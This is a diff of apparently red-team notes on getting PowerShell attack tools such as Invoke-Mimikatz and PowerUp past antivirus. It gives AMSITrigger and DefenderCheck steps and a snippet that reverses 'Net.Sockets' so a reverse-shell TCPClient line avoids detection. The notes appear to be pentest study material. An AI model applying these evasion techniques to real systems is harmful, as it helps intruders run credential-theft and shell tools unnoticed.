@@ -14,21 +14,23 @@
 
 Bypassing AV Signatures for PowerShell
 .      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
-.      if u r going to run a powershell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
+.      if u r going to run a PowerShell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
 .      Scan using AMSITrigger 'AmsiTrigger_x64.exe -i PowerUp.ps1' | Modify the detected code by reversing ex. 'System.AppDomain' to 'niamoDppA.metsyS' | Rescan using AMSITrigger | Repeat the steps till u get a result as "AMSI_RESULT_NOT_DETECTED"
-.      u can use DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that windows Defender may flag
+.      u can use DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag
 .      simply provide path to the script file to scan it
 -     AmsiTrigger_x64.exe -i C:\AD\Tools\Invok-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
-.      for full obfusction of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
+.      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
 example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
 Reverse the "Net.Sockets" string on line number 32
-.      $string = "stekcoS.teN"
-.      $class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
-.      if ($Reverse)
-.      {
-.      $client = New-Object System.$class.TCPClient($IPAddress,$PORT)
-.      }
-
+## AMSITrigger
+```powershell
+$string = "stekcoS.teN"
+$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
+if ($Reverse)
+{
+$client = New-Object System.$class.TCPClient($IPAddress,$PORT)
+}
+```
 
 # Methodology Master
 ---
